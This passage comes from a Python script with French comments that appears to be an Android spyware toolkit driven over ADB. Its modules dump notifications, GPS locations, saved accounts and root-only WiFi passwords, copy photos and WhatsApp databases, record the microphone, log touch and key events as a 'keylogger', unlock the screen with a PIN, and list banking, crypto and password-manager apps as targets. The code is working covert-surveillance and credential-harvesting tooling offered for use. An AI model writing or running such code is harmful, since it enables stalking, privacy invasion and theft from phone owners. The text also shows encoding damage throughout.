# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def live_screen():
    """Afficher l'Ã©cran en direct avec scrcpy"""
    print(f"\n{C.CYAN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}ğŸ“º AFFICHAGE EN DIRECT{C.END}")
    print(f"{C.CYAN}{'â•'*70}{C.END}\n")
    
    if os.path.exists(SCRCPY_PATH):
        print_info("Lancement de scrcpy...")
        print_info("Vous pouvez contrÃ´ler le tÃ©lÃ©phone avec la souris/clavier")
        
        cmd = f'"{SCRCPY_PATH}"'
        if DEVICE:
            cmd += f' -s {DEVICE}'
        
        subprocess.Popen(cmd, shell=True)
        print_success("Scrcpy lancÃ©!")
    else:
        print_error("Scrcpy non trouvÃ©!")
        print_info("Installation: winget install Genymobile.scrcpy")

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# MODULE 8: NOTIFICATIONS
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def get_notifications():
    """Lire les notifications"""
    print(f"\n{C.CYAN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}ğŸ”” NOTIFICATIONS{C.END}")
    print(f"{C.CYAN}{'â•'*70}{C.END}\n")
    
    notifs = adb_shell("dumpsys notification --noredact")
    
    # Extraire les infos importantes
    important = []
    current_pkg = ""
    current_title = ""
    current_text = ""
    
    for line in notifs.split('\n'):
        if 'pkg=' in line:
            if current_pkg:
                important.append(f"{current_pkg}: {current_title} - {current_text}")
            current_pkg = line.split('pkg=')[1].split()[0] if 'pkg=' in line else ""
            current_title = ""
            current_text = ""
        elif 'android.title=' in line:
            current_title = line.split('android.title=')[1].split(',')[0][:50]
        elif 'android.text=' in line:
            current_text = line.split('android.text=')[1].split(',')[0][:50]
    
    # Afficher les notifications
    print(f"    {C.YELLOW}DerniÃ¨res notifications:{C.END}\n")
    
    for notif in important[:15]:
        if notif.strip():
            print(f"        ğŸ”” {notif[:70]}")
    
    # Sauvegarder
    with open(OUTPUT_BASE / "Notifications" / "notifications.txt", "w", encoding="utf-8") as f:
        f.write(f"=== NOTIFICATIONS - {datetime.now()} ===\n\n")
        f.write('\n'.join(important))
    
    print_success(f"SauvegardÃ©: Notifications/notifications.txt")
    
    return len(important)

def send_notification(title, message):
    """Envoyer une notification au tÃ©lÃ©phone"""
    print(f"\n{C.CYAN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}ğŸ“¨ ENVOI DE NOTIFICATION{C.END}")
    print(f"{C.CYAN}{'â•'*70}{C.END}\n")
    
    title = title.replace("'", "\\'").replace('"', '\\"')
    message = message.replace("'", "\\'").replace('"', '\\"')
    
    notif_id = f"notif_{datetime.now().strftime('%H%M%S')}"
    result = adb_shell(f'cmd notification post -t "{title}" "{message}" {notif_id}')
    
    if "posting" in result.lower() or "notification" in result.lower():
        print_success(f"Notification envoyÃ©e!")
        print_data("Titre", title)
        print_data("Message", message)
        return True
    else:
        print_error("Ã‰chec de l'envoi")
        return False

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# MODULE 9: LOCALISATION GPS
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def get_location():
    """Obtenir la localisation GPS"""
    print(f"\n{C.CYAN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}ğŸ“ LOCALISATION GPS{C.END}")
    print(f"{C.CYAN}{'â•'*70}{C.END}\n")
    
    location = adb_shell("dumpsys location")
    
    # Chercher les coordonnÃ©es
    print(f"    {C.YELLOW}DerniÃ¨res positions connues:{C.END}\n")
    
    coords = []
    for line in location.split('\n'):
        if any(x in line.lower() for x in ['last location', 'mlastlocation', 'location=', 'latitude', 'longitude']):
            coords.append(line.strip())
            if len(coords) <= 10:
                print(f"        ğŸ“ {line.strip()[:70]}")
    
    # Provider actif
    print(f"\n    {C.YELLOW}Fournisseurs de localisation:{C.END}")
    providers = adb_shell("settings get secure location_providers_allowed")
    print_data("Actifs", providers)
    
    # Sauvegarder
    with open(OUTPUT_BASE / "GPS" / "location.txt", "w", encoding="utf-8") as f:
        f.write(f"=== LOCALISATION - {datetime.now()} ===\n\n")
        f.write(location)
    
    print_success(f"SauvegardÃ©: GPS/location.txt")
    
    return coords

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# MODULE 10: RÃ‰SEAUX WIFI
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def get_wifi_networks():
    """Lister les rÃ©seaux WiFi enregistrÃ©s"""
    print(f"\n{C.CYAN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}ğŸ“¶ RÃ‰SEAUX WIFI ENREGISTRÃ‰S{C.END}")
    print(f"{C.CYAN}{'â•'*70}{C.END}\n")
    
    # MÃ©thode 1: cmd wifi (Android 10+)
    networks = adb_shell("cmd wifi list-networks 2>/dev/null")
    
    if networks and "Network Id" in networks:
        print(f"    {C.YELLOW}RÃ©seaux enregistrÃ©s:{C.END}\n")
        for line in networks.split('\n'):
            if line.strip() and "Network Id" not in line:
                print(f"        ğŸ“¶ {line.strip()}")
    
    # MÃ©thode 2: fichier config (avec root)
    wifi_config = adb_shell("su -c 'cat /data/misc/wifi/WifiConfigStore.xml' 2>/dev/null")
    
    if "SSID" in wifi_config:
        print(f"\n    {C.YELLOW}Avec mots de passe (root requis):{C.END}\n")
        for line in wifi_config.split('\n'):
            if 'SSID' in line or 'PreSharedKey' in line:
                print(f"        ğŸ” {line.strip()[:60]}")
    
    # RÃ©seau actuel
    print(f"\n    {C.YELLOW}Connexion actuelle:{C.END}")
    current = adb_shell("dumpsys wifi | grep 'mWifiInfo'")
    if current:
        print_data("Info", current[:100])
    
    # Sauvegarder
    with open(OUTPUT_BASE / "WiFi" / "wifi_networks.txt", "w", encoding="utf-8") as f:
        f.write(f"=== WIFI - {datetime.now()} ===\n\n")
        f.write("=== RÃ‰SEAUX ===\n")
        f.write(networks)
        f.write("\n\n=== CONFIG (si root) ===\n")
        f.write(wifi_config[:5000])
    
    print_success(f"SauvegardÃ©: WiFi/wifi_networks.txt")

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# MODULE 11: APPLICATIONS
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def list_apps():
    """Lister les applications installÃ©es"""
    print(f"\n{C.CYAN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}ğŸ“± APPLICATIONS INSTALLÃ‰ES{C.END}")
    print(f"{C.CYAN}{'â•'*70}{C.END}\n")
    
    # Apps tierces
    apps = adb_shell("pm list packages -3")
    app_list = [line.replace("package:", "") for line in apps.split('\n') if line.strip()]
    
    print(f"    {C.YELLOW}Applications tierces ({len(app_list)}):{C.END}\n")
    
    # Apps sensibles
    sensitive = {
        "com.whatsapp": "WhatsApp",
        "com.facebook.katana": "Facebook",
        "com.instagram.android": "Instagram",
        "com.google.android.gm": "Gmail",
        "com.zhiliaoapp.musi"
        "cally": "TikTok",
        "org.telegram.messenger": "Telegram",
        "com.snapchat.android": "Snapchat",
        "com.twitter.android": "Twitter/X",
    }
    
    for pkg, name in sensitive.items():
        if pkg in apps:
            print(f"        ğŸ”´ {name} ({pkg})")
    
    print(f"\n        ... et {len(app_list) - sum(1 for p in sensitive if p in apps)} autres apps")
    
    # Sauvegarder
    with open(OUTPUT_BASE / "Apps" / "installed_apps.txt", "w", encoding="utf-8") as f:
        f.write(f"=== APPLICATIONS - {datetime.now()} ===\n\n")
        f.write('\n'.join(sorted(app_list)))
    
    print_success(f"SauvegardÃ©: Apps/installed_apps.txt ({len(app_list)} apps)")
    
    return app_list

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# MODULE 12: TÃ‰LÃ‰CHARGEMENT FICHIERS
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def download_photos():
    """TÃ©lÃ©charger les photos"""
    print(f"\n{C.CYAN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}ğŸ“· TÃ‰LÃ‰CHARGEMENT DES PHOTOS{C.END}")
    print(f"{C.CYAN}{'â•'*70}{C.END}\n")
    
    dest = OUTPUT_BASE / "Photos"
    
    print_info("TÃ©lÃ©chargement de DCIM/Camera...")
    adb_pull("/sdcard/DCIM/Camera", str(dest / "Camera"))
    
    print_info("TÃ©lÃ©chargement de Pictures...")
    adb_pull("/sdcard/Pictures", str(dest / "Pictures"))
    
    # Compter
    count = sum(1 for f in dest.rglob("*") if f.is_file())
    print_success(f"{count} fichiers tÃ©lÃ©chargÃ©s dans Photos/")
    
    return count

def download_whatsapp():
    """TÃ©lÃ©charger les donnÃ©es WhatsApp"""
    print(f"\n{C.CYAN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}ğŸ’¬ TÃ‰LÃ‰CHARGEMENT WHATSAPP{C.END}")
    print(f"{C.CYAN}{'â•'*70}{C.END}\n")
    
    dest = OUTPUT_BASE / "WhatsApp"
    
    print_info("TÃ©lÃ©chargement WhatsApp Media...")
    adb_pull("/sdcard/WhatsApp/Media", str(dest / "Media"))
    
    print_info("TÃ©lÃ©chargement WhatsApp Databases...")
    adb_pull("/sdcard/WhatsApp/Databases", str(dest / "Databases"))
    
    # Compter
    count = sum(1 for f in dest.rglob("*") if f.is_file())
    print_success(f"{count} fichiers tÃ©lÃ©chargÃ©s dans WhatsApp/")
    
    return count

def download_documents():
    """TÃ©lÃ©charger les documents"""
    print(f"\n{C.CYAN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}ğŸ“„ TÃ‰LÃ‰CHARGEMENT DOCUMENTS{C.END}")
    print(f"{C.CYAN}{'â•'*70}{C.END}\n")
    
    dest = OUTPUT_BASE / "Documents"
    
    print_info("TÃ©lÃ©chargement Documents...")
    adb_pull("/sdcard/Documents", str(dest / "Documents"))
    
    print_info("TÃ©lÃ©chargement Download...")
    adb_pull("/sdcard/Download", str(dest / "Download"))
    
    count = sum(1 for f in dest.rglob("*") if f.is_file())
    print_success(f"{count} fichiers tÃ©lÃ©chargÃ©s dans Documents/")
    
    return count

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# MODULE 13: CONTRÃ”LE DU TÃ‰LÃ‰PHONE
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def open_url(url):
    """Ouvrir une URL sur le tÃ©lÃ©phone"""
    adb_shell(f'am start -a android.intent.action.VIEW -d "{url}"')
    print_success(f"URL ouverte: {url}")

def open_app(package):
    """Ouvrir une application"""
    adb_shell(f"monkey -p {package} -c android.intent.category.LAUNCHER 1")
    print_success(f"Application lancÃ©e: {package}")

def send_key(keycode):
    """Envoyer une touche"""
    adb_shell(f"input keyevent {keycode}")

def send_text(text):
    """Envoyer du texte"""
    text = text.replace(" ", "%s").replace("'", "\\'")
    adb_shell(f'input text "{text}"')
    print_success(f"Texte envoyÃ©: {text}")

def take_call(number):
    """Passer un appel"""
    adb_shell(f'am start -a android.intent.action.CALL -d "tel:{number}"')
    print_success(f"Appel vers: {number}")

def send_sms_screen(number, message=""):
    """Ouvrir l'Ã©cran SMS"""
    message = message.replace(" ", "%20")
    adb_shell(f'am start -a android.intent.action.SENDTO -d "sms:{number}" --es sms_body "{message}"')
    print_success(f"Ã‰cran SMS ouvert pour: {number}")

def vibrate():
    """Faire vibrer le tÃ©lÃ©phone"""
    adb_shell("cmd vibrator vibrate 500")
    print_success("Vibration envoyÃ©e")

def set_volume(level):
    """RÃ©gler le volume"""
    adb_shell(f"cmd media_session volume --set {level}")
    print_success(f"Volume rÃ©glÃ© Ã  {level}")

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# MODULE 14: SHELL INTERACTIF
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def interactive_shell():
    """Shell interactif"""
    print(f"\n{C.CYAN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}ğŸ’» SHELL INTERACTIF{C.END}")
    print(f"{C.CYAN}{'â•'*70}{C.END}\n")
    
    print_info("Tapez 'exit' pour quitter")
    print_info("Exemples: ls /sdcard, cat /proc/cpuinfo, getprop\n")
    
    while True:
        try:
            cmd = input(f"{C.GREEN}shell>{C.END} ").strip()
            
            if cmd.lower() == 'exit':
                break
            
            if cmd:
                result = adb_shell(cmd)
                print(result)
        except KeyboardInterrupt:
            break
    
    print_info("Shell fermÃ©")

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# MODULE 15: COMPTES ET IDENTIFIANTS
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def get_accounts():
    """RÃ©cupÃ©rer tous les comptes enregistrÃ©s"""
    print(f"\n{C.CYAN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}ğŸ‘¤ COMPTES ENREGISTRÃ‰S{C.END}")
    print(f"{C.CYAN}{'â•'*70}{C.END}\n")
    
    accounts = adb_shell("dumpsys account")
    
    # Extraire les comptes
    account_list = []
    
    print(f"    {C.YELLOW}Comptes trouvÃ©s:{C.END}\n")
    
    for line in accounts.split('\n'):
        if 'Account {name=' in line:
            # Format: Account {name=email@gmail.com, type=com.google}
            try:
                name = line.split('name=')[1].split(',')[0]
                acc_type = line.split('type=')[1].split('}')[0]
                account_list.append({"name": name, "type": acc_type})
                
                # IcÃ´ne selon le type
                if 'google' in acc_type.lower():
                    icon = "ğŸ”´"
                elif 'facebook' in acc_type.lower():
                    icon = "ğŸ”µ"
                elif 'whatsapp' in acc_type.lower():
                    icon = "ğŸŸ¢"
                elif 'samsung' in acc_type.lower():
                    icon = "ğŸ”·"
                else:
                    icon = "ğŸ‘¤"
                
                print(f"        {icon} {name}")
                print(f"           Type: {acc_type}")
            except:
                pass
    
    # Sauvegarder
    with open(OUTPUT_BASE / "System" / "accounts.json", "w", encoding="utf-8") as f:
        json.dump(account_list, f, indent=2, ensure_ascii=False)
    
    with open(OUTPUT_BASE / "System" / "accounts_raw.txt", "w", encoding="utf-8") as f:
        f.write(accounts)
    
    print(f"\n{C.GREEN}    âœ… {len(account_list)} comptes trouvÃ©s{C.END}")
    print_success("SauvegardÃ©: System/accounts.json")
    
    return account_list

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# MODULE 16: APPS SENSIBLES ET DONNÃ‰ES BANCAIRES
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def detect_sensitive_apps():
    """DÃ©tecter les applications sensibles (banque, crypto, etc.)"""
    print(f"\n{C.CYAN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}ğŸ” DÃ‰TECTION APPS SENSIBLES{C.END}")
    print(f"{C.CYAN}{'â•'*70}{C.END}\n")
    
    # Liste des apps sensibles par catÃ©gorie
    SENSITIVE_APPS = {
        "ğŸ’³ BANQUE / PAIEMENT": [
            ("com.paypal.android.p2pmobile", "PayPal"),
            ("com.venmo", "Venmo"),
            ("com.squareup.cash", "Cash App"),
            ("com.google.android.apps.walletnfcrel", "Google Pay"),
            ("com.samsung.android.spay", "Samsung Pay"),
            ("com.apple.android.music", "Apple Pay"),
            ("com.revolut.revolut", "Revolut"),
            ("com.n26.android", "N26"),
            ("com.wf.wellsfargomobile", "Wells Fargo"),
            ("com.chase.sig.android", "Chase"),
            ("com.bankofamerica.cashpromobile", "Bank of America"),
            ("fr.bnpp.mescomptes", "BNP Paribas"),
            ("com.cic_prod.bad", "CIC"),
            ("com.cm_prod.bad", "CrÃ©dit Mutuel"),
            ("com.labanquepostale.ecoapp", "La Banque Postale"),
            ("com.boursorama.android.clients", "Boursorama"),
            ("fr.lcl.android.customerarea", "LCL"),
            ("mobi.societegenerale.mobile.lappli", "SociÃ©tÃ© GÃ©nÃ©rale"),
        ],
        "ğŸª™ CRYPTO": [
            ("com.binance.dev", "Binance"),
            ("com.coinbase.android", "Coinbase"),
            ("piuk.blockchain.android", "Blockchain.com"),
            ("com.wallet.crypto.trustapp", "Trust Wallet"),
            ("io.metamask", "MetaMask"),
            ("com.kraken.trade", "Kraken"),
            ("exodusmovement.exodus", "Exodus"),
            ("com.krakenfutures.app", "Kraken Futures"),
            ("com.robinhood.android", "Robinhood"),
        ],
        "ğŸ’¬ MESSAGERIE PRIVÃ‰E": [
            ("com.whatsapp", "WhatsApp"),
            ("org.telegram.messenger", "Telegram"),
            ("com.Slack", "Slack"),
            ("com.discord", "Discord"),
            ("org.thoughtcrime.securesms", "Signal"),
            ("com.viber.voip", "Viber"),
            ("com.snapchat.android", "Snapchat"),
            ("com.facebook.orca", "Messenger"),
        ],
        "ğŸ“§ EMAIL": [
            ("com.google.android.gm", "Gmail"),
            ("com.microsoft.office.outlook", "Outlook"),
            ("com.yahoo.mobile.client.android.mail", "Yahoo Mail"),
            ("com.apple.android.email", "Apple Mail"),
        ],
        "â˜ï¸ CLOUD / STOCKAGE": [
            ("com.google.android.apps.docs", "Google Drive"),
            ("com.dropbox.android", "Dropbox"),
            ("com.microsoft.skydrive", "OneDrive"),
            ("com.apple.android.icloud", "iCloud"),
        ],
        "ğŸ”‘ MOTS DE PASSE": [
            ("com.lastpass.lpandroid", "LastPass"),
            ("com.x8bit.bitwarden", "Bitwarden"),
            ("com.agilebits.onepassword", "1Password"),
            ("com.dashlane", "Dashlane"),
            ("keepass2android.keepass2android", "KeePass"),
        ],
        "ğŸ“± RÃ‰SEAUX SOCIAUX": [
            ("com.instagram.android", "Instagram"),
            ("com.facebook.katana", "Facebook"),
            ("com.twitter.android", "Twitter/X"),
            ("com.zhiliaoapp.musically", "TikTok"),
            ("com.linkedin.android", "LinkedIn"),
            ("com.pinterest", "Pinterest"),
        ],
    }
    
    # Obtenir la liste des apps installÃ©es
    installed = adb_shell("pm list packages")
    
    found_sensitive = {}
    total_found = 0
    
    for category, apps in SENSITIVE_APPS.items():
        found_in_category = []
        
        for package, name in apps:
            if package in installed:
                found_in_category.append({"package": package, "name": name})
                total_found += 1
        
        if found_in_category:
            found_sensitive[category] = found_in_category
            print(f"    {C.RED}{category}{C.END}")
            for app in found_in_category:
                print(f"        âš ï¸  {app['name']} ({app['package']})")
            print()
    
    # Sauvegarder
    with open(OUTPUT_BASE / "Apps" / "sensitive_apps.json", "w", encoding="utf-8") as f:
        json.dump(found_sensitive, f, indent=2, ensure_ascii=False)
    
    print(f"\n{C.RED}    ğŸš¨ {total_found} APPLICATIONS SENSIBLES DÃ‰TECTÃ‰ES!{C.END}")
    print_success("SauvegardÃ©: Apps/sensitive_apps.json")
    
    return found_sensitive

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# MODULE 17: ENREGISTREMENT AUDIO
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def record_audio(duration=30):
    """Enregistrer le microphone"""
    print(f"\n{C.CYAN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}ğŸ¤ ENREGISTREMENT AUDIO{C.END}")
    print(f"{C.CYAN}{'â•'*70}{C.END}\n")
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    remote_file = f"/sdcard/audio_{timestamp}.mp4"
    local_file = OUTPUT_BASE / "Recordings" / f"audio_{timestamp}.mp4"
    
    print_info(f"Enregistrement audio pendant {duration} secondes...")
    print_warning("Le microphone du tÃ©lÃ©phone enregistre l'environnement")
    
    # Utiliser mediarecorder via am
    # Note: NÃ©cessite une app d'enregistrement ou utiliser input
    adb_shell(f"am start -a android.provider.MediaStore.RECORD_SOUND")
    time.sleep(2)
    
    # Alternative: screenrecord capture aussi l'audio
    print_info("Utilisation de la capture avec audio...")
    adb_shell(f"screenrecord --time-limit {duration} --bit-rate 1000000 {remote_file}", timeout=duration+10)
    
    adb_pull(remote_file, str(local_file))
    adb_shell(f"rm {remote_file}")
    
    if local_file.exists():
        print_success(f"Audio sauvegardÃ©: {local_file.name}")
        print_info(f"Chemin du fichier audio : {local_file}")
        return str(local_file)
    else:
        print_warning("Capture audio limitÃ©e - essayez avec une app d'enregistrement")
        return None

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# MODULE 18: KEYLOGGER SIMPLE
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def capture_input_events():
    """Capturer les Ã©vÃ©nements d'entrÃ©e (touches, Ã©cran)"""
    print(f"\n{C.CYAN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}âŒ¨ï¸ CAPTURE D'Ã‰VÃ‰NEMENTS{C.END}")
    print(f"{C.CYAN}{'â•'*70}{C.END}\n")
    
    print_info("Capture des Ã©vÃ©nements tactiles pendant 10 secondes...")
    print_warning("Touchez l'Ã©cran du tÃ©lÃ©phone pour tester")
    
    # getevent capture les Ã©vÃ©nements bruts
    events = adb_shell("timeout 10 getevent -l", timeout=15)
    
    # Analyser
    touch_count = events.count("ABS_MT")
    key_count = events.count("KEY_")
    
    print(f"\n    ğŸ“Š RÃ©sultats:")
    print_data("Ã‰vÃ©nements tactiles", touch_count)
    print_data("Ã‰vÃ©nements clavier", key_count)
    
    # Sauvegarder
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    with open(OUTPUT_BASE / "System" / f"input_events_{timestamp}.txt", "w", encoding="utf-8") as f:
        f.write(events)
    
    print_success(f"SauvegardÃ©: System/input_events_{timestamp}.txt")
    
    return events

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# MODULE 18B: CONTRÃ”LE Ã‰CRAN AVANCÃ‰
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def screen_off():
    """Ã‰teindre l'Ã©cran"""
    adb_shell("input keyevent KEYCODE_POWER")
    print_success("Ã‰cran Ã©teint")

def screen_on():
    """Allumer l'Ã©cran"""
    adb_shell("input keyevent KEYCODE_WAKEUP")
    print_success("Ã‰cran allumÃ©")

def unlock_screen(pin=""):
    """DÃ©verrouiller l'Ã©cran (swipe + PIN optionnel)"""
    print(f"\n{C.CYAN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}ğŸ”“ DÃ‰VERROUILLAGE Ã‰CRAN{C.END}")
    print(f"{C.CYAN}{'â•'*70}{C.END}\n")
    
    # Allumer l'Ã©cran
    adb_shell("input keyevent KEYCODE_WAKEUP")
    time.sleep(0.5)
    
    # Swipe pour dÃ©verrouiller
    adb_shell("input swipe 540 1800 540 800 300")
    time.sleep(0.5)
    
    # Si PIN fourni
    if pin:
        adb_shell(f'input text "{pin}"')
        time.sleep(0.3)
        adb_shell("input keyevent KEYCODE_ENTER")
    
    print_success("Tentative de dÃ©verrouillage effectuÃ©e")

def lock_screen():
    """Verrouiller l'Ã©cran"""
    adb_shell("input keyevent KEYCODE_POWER")
    print_success("Ã‰cran verrouillÃ©")

def set_brightness(level):
    """RÃ©gler la luminositÃ© (0-255)"""
    level = max(0, min(255, int(level)))
    adb_shell(f"settings put system screen_brightness {level}")
    print_success(f"LuminositÃ© rÃ©glÃ©e Ã  {level}/255")

def rotate_screen(orientation):
    """Rotation Ã©cran: 0=portrait, 1=paysage, 2=portrait inversÃ©, 3=paysage inversÃ©"""
    adb_shell("settings put system accelerometer_rotation 0")
    adb_shell(f"settings put system user_rotation {orientation}")
    orientations = {0: "Portrait", 1: "Paysage", 2: "Portrait inversÃ©", 3: "Paysage inversÃ©"}
    print_success(f"Orientation: {orientations.get(orientation, orientation)}")

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
